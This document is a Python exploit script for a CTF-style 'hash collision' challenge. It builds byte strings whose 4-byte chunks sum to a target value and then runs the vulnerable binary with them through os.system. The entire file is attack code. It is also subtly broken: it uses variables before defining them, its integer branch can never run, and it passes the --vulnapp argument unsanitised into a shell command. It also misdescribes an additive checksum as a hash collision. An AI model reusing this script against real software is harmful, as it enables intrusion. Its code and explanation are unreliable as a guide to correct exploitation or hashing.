#!/usr/bin/env python3
###############################################################
## [Name]: hash-collision-attack.py -- a pwnable script purpose
## [Author]: Naivenom www.fwhibbit.es
##-------------------------------------------------------------
## [Details]:
## Script to perform a A Hash Collision Attack is an attempt to find two input strings of a hash function that produce the same hash result.
## Because hash functions have infinite input length and a predefined output length, there is inevitably going to be the possibility of two different inputs that produce the same output hash.
## If two separate inputs produce the same hash output, it is called a collision. This collision can then be exploited by any application that compares two hashes together â€“ such as password hashes, file integrity checks, etc.
##------------------------------------------------------------
## [Usage]:
## python3 hash-collision-attack.py --hashcode 0x21DD09EC --chunkbytes 5 --vulnapp col
###############################################################

import os
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('--hashcode', action='store', dest='hashcode',
					help='Hashcode to check. We need to know how many bytes are used in hashcode')

parser.add_argument('--chunkbytes', action='store', dest='chunkbytes',
					help='We need to know how many iteration has the password hash function to use chunks bytes. So number of chunk bytes (integer value 4 bytes)')

parser.add_argument('--vulnapp', action='store', dest='vulnapp',
					help='Bash vulnapp execute')

parser.add_argument('--version', action='version', version='%(prog)s 0.1')

results = parser.parse_args()
print('[+]Hashcode:', results.hashcode)
print ('[+]Number of chunk bytes:', results.chunkbytes)
print ('[+]Vulnapp:', results.vulnapp)

c = 0
x = "\\x"
array1 = []
array2 = []
reverse_array1= []
reverse_array2= []
hashcode = results.hashcode
chunkbytes = results.chunkbytes
vulnapp = results.vulnapp

divide = int(hashcode, 16)/int(chunkbytes)

def explotationFloat():
	print('[+] EXPLOTATION:')
	reverse_array1 = array1.reverse()
	reverse_array2 = array2.reverse()
	stri1 = ''.join(array1)
	exploit1 = "'"+stri1+"'"
	print('\t',exploit1)
	stri2 = ''.join(array2)
	exploit2 = "'"+stri2+"'"
	print('\t',exploit2)
	print("[+] PYTHON EXPLOIT CODE:",'./%s $(python -c "print(%s*%s+%s)")'%(vulnapp, exploit1,int(chunkbytes)-1, exploit2))
	os.system('./%s $(python -c "print(%s*%s+%s)")'%(vulnapp, exploit1,int(chunkbytes)-1, exploit2))

def explotationInteger():
	print('[+] EXPLOTATION:')
	reverse_array1 = array1.reverse()
	stri1 = ''.join(array1)
	exploit1 = "'"+stri1+"'"
	print('\t',exploit1)
	print("[+] PYTHON EXPLOIT CODE:",'./%s $(python -c "print(%s*%s)")'%(vulnapp, exploit1,int(chunkbytes)))
	os.system('./%s $(python -c "print(%s*%s)")'%(vulnapp, exploit1,int(chunkbytes)))

if type(divide) == float:
	roundvalue = int(divide)
	sub = int(hashcode, 16) - roundvalue*(int(chunkbytes)-1)
	hex1 = hex(roundvalue)
	hex2 = hex(sub)
	hex1Withoutx = hex1.rsplit('x', 1)[1]
	hex2Withoutx = hex2.rsplit('x', 1)[1]
	lenHex1Withoutx = int(len(hex1Withoutx))
	lenHex2Withoutx = int(len(hex2Withoutx))
	if lenHex1Withoutx%2 == 0 and lenHex2Withoutx%2 == 0:
		for i in range(int(len(hex1Withoutx))//2):
			array1.append(str(x)+hex1WithoutxPlus0[c:2+c])
			c = c+2
		c = 0
		for i in range(int(len(hex2Withoutx))//2):
			array2.append(str(x)+hex2WithoutxPlus0[c:2+c])
			c = c+2
		explotationFloat()
	else:
		hex1WithoutxPlus0 = "0"+hex1Withoutx
		hex2WithoutxPlus0 = "0"+hex2Withoutx
		for i in range(int(len(hex1WithoutxPlus0))//2):
			array1.append(str(x)+hex1WithoutxPlus0[c:2+c])
			c = c+2
		c = 0
		for i in range(int(len(hex2WithoutxPlus0))//2):
			array2.append(str(x)+hex2WithoutxPlus0[c:2+c])
			c = c+2
		explotationFloat()

else: #integer and round value, not float
	hex1 = hex(divide)
	hex1Withoutx = hex1.rsplit('x', 1)[1]
	lenHex1Withoutx = int(len(hex1Withoutx))
	if lenHex1Withoutx%2 == 0 and lenHex2Withoutx%2 == 0:
		for i in range(int(len(hex1Withoutx))//2):
			array1.append(str(x)+hex1WithoutxPlus0[c:2+c])
			c = c+2
		explotationInteger()
	else:
		hex1WithoutxPlus0 = "0"+hex1Withoutx
		for i in range(int(len(hex1WithoutxPlus0))//2):
			array1.append(str(x)+hex1WithoutxPlus0[c:2+c])
			c = c+2
		explotationFloat()
